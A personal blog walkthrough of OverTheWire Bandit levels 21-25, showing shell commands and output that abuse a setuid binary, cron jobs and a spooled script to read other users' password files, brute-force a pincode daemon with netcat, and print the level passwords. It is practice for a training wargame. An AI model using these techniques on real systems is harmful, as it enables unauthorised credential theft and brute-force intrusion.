---
layout: post
title: "OverTheWire: Bandit 21-25"
date: 2021-04-11 11:36:00
tags: [Security, Overthewire, Linux, Pentesting]
style: border
color: primary
description: OTW - Bandit Walkthrough 21-25
---

Welcome to another post on our series of [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)! This post covers my walkthrough of levels 21-25. If you would like to jump to specific level then each level with be accompanied with the username and password. I will be appending consecutive levels as I have to time to post. Enjoy!

## Bandit 21

[http://overthewire.org/wargames/bandit/bandit21.html](http://overthewire.org/wargames/bandit/bandit21.html)

There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

**NOTE:** Try connecting to your own network daemon to see if it works as you think

Okay so we do a quick `ls` to see the name of the setuid binary.

```console
bandit20@bandit:~$ ls -l
total 12
-rwsr-x--- 1 bandit21 bandit20 12088 May  7  2020 suconnect
```

Alright let's break this one down:

1. Make a network listener on a port of our choice
2. Make a connection to the port we're listening on using the setuid binary (`suconnect`)

However, there's just one problem. How do we do all this from one single terminal?
If we create the listener then it is awaiting a response and does not allow us to enter any other commands. 

A utility called `tmux` can create separate terminal sessions from a single terminal. If you need more info on `tmux` then use the following quick cheatsheet [here](https://tmuxcheatsheet.com/).

Okay now let's put this all together. 

**1. Create a tmux session with a name**

```console
tmux new -s mysession
```

**2. Make a network listener on a port of our choice in a *tmux pane*.**

```console
bandit20@bandit:~$ nc -l -p 4444
```

Now to create a pane
![](https://i.imgur.com/v2tbHyv.png)

**3. Connect to port 4444 using setuid binary** 

```console
bandit20@bandit:~$ ./suconnect 4444
```

**4. Switch back to our our pane running the listener and send the password.**

Switch back to our other pane
![](https://i.imgur.com/yZxrySJ.png)

Send the password for user bandit20

```console
bandit20@bandit:~$ nc -l -p 4444
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```
Profit! We received the password that is sent from `suconnect`

suconnect pane:
```console
bandit20@bandit:~$ ./suconnect 4444
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
```

Here's a demo in action:
![](https://i.imgur.com/omgFArh.gif)

> **Username:** bandit21
> **Password:** gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

---

## Bandit 22

[http://overthewire.org/wargames/bandit/bandit22.html](http://overthewire.org/wargames/bandit/bandit22.html)

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

Very easy level, you'll need to read about cron, but for now first paragraph of this [link ](https://help.ubuntu.com/community/CronHowto)will do:

```
 "Cron is a system daemon used to execute desired tasks (in the background) at
 designated times.
 
 A crontab file is a simple text file containing a list of commands meant to be
 run at specified times. It is edited using the crontab command. The commands
 in the crontab file (and their run times) are checked by the cron daemon,
 which executes them in the system background."
```

First, let's see which cron job is being executed for bandit 22:

```console
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```

What does `/usr/bin/cronjob_bandit22.sh` do?

```console
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

First line after the sha-bang gives the temp file the following permissions: user can write, anyone can read. So we're able to read the content of that file.
Second line copies the content of /etc/bandit_pass/bandit22 (containing our password) to the temporary file. Check it's content and you'll find the password to the next level!

```console
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

> **Username:** bandit22
> **Password:** Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

---

## Bandit 23

[http://overthewire.org/wargames/bandit/bandit23.html](http://overthewire.org/wargames/bandit/bandit23.html)

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE**: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

Same steps as before, let's see what the cronjob does:

```console
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

Okay so lets see what the script `/usr/bin/cronjob_bandit23.sh` does:

```console
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

Okay so this script is being execute as bandit23 from the cronjob which means when the script executes `whoami` it is parsing `bandit23` as the value for the variable `$myname`. 

Then we need to get the MD5 encoding of $target (which is "I am user bandit23"), then read the content of `/tmp/<MD5output>`:

```console
bandit22@bandit:/etc/cron.d$ md5sum <<< $(echo I am user bandit23)
8ca319486bfbbc3663ea0fbe81326349 -
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
bandit22@bandit:/etc/cron.d$
```

> **Username:** bandit23
> **Password:** jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

---

## Bandit 24

[http://overthewire.org/wargames/bandit/bandit24.html](http://overthewire.org/wargames/bandit/bandit24.html)

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE**: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2**: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

More cron stuff, let's see what the script does:

```console
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

So it navigates to `/var/spool/bandit24` directory and executes all scripts as bandit24. Alright, so we need to make our script that writes the contents of `/etc/bandit_pass/bandit24` somewhere. 

Make sure you give the script and the folder the correct permissions.

```console
bandit23@bandit:/etc/cron.d$ mkdir /tmp/bd2324
bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/bd2324
bandit23@bandit:/etc/cron.d$ cd /tmp/bd2324
bandit23@bandit:/tmp/bd2324$ cat > myscript2324.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bd2324/password
^C
bandit23@bandit:/tmp/bd2324$ chmod 777 myscript2324.sh
```

Okay now that we've create the script and gave it all the proper permissions...we just need to copy that script to correct path contained within the `cronjob_bandit24.sh` script.
```console
bandit23@bandit:/tmp/bd2324$ cp myscript2324.sh /var/spool/bandit24/
```

Now we wait for cron to execute the script. 

**Pro TIP**: If you don't want to type `ls` a gazillion times waiting for the file to appear use the following:

`watch -n 1 -x ls /tmp/bd2324`

Watch essentially repeats the `ls` command at our directory every 1 second. 

```console
bandit23@bandit:/tmp/bd2324$ ls -al /var/spool/bandit24/
total 153
drwxrwxrwx 2 bandit24 bandit23 151552 Oct 21 23:08 .
drwxr-xr-x 6 root   root    4096 May 3 2015 ..
bandit23@bandit:/tmp/bd2324$ ls
password myscript2324.sh
bandit23@bandit:/tmp/bd2324$ cat password
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Script got deleted, which means cron executed it and we got our password!

> **Username:** bandit24
> **Password:** UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

---

## Bandit 25

[http://overthewire.org/wargames/bandit/bandit25.html](http://overthewire.org/wargames/bandit/bandit25.html)

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

This sounds like a perfect job for a for loop in bash! You may want to read more about looping in bash [here](http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-7.html).

First let's see how the daemon behaves. 

```console
bandit24@bandit:/tmp/bd2425$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
Wrong! Please enter the correct pincode. Try again.
```

Okay looks like if we enter the wrong pin then it ruturns an error and it allows multiple input. So now we can create essentially a dictionary file with the format "password pin" for 0000-9999.

Let's create a temp directory and our dictionary:

```console
bandit24@bandit:/tmp/bd2425$ for i in $(seq 0000 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pincodes.txt; done
bandit24@bandit:/tmp/bd2425$ head pincodes.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 3
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 4
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 6
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 7
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 8
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9
bandit24@bandit:/tmp/bd2425$ tail pincodes.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9990
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9991
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9992
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9993
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9994
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9995
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9996
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9997
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9998
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999
```

Looks good now let's feed it to `nc` and invert-match using `grep`.

```console
bandit24@bandit:/tmp/bd2425$ nc -nv 127.0.0.1 30002 < pincodes.txt | grep -v Wrong
Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
Exiting.
```

> **Username:** bandit24
> **Password:** UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

---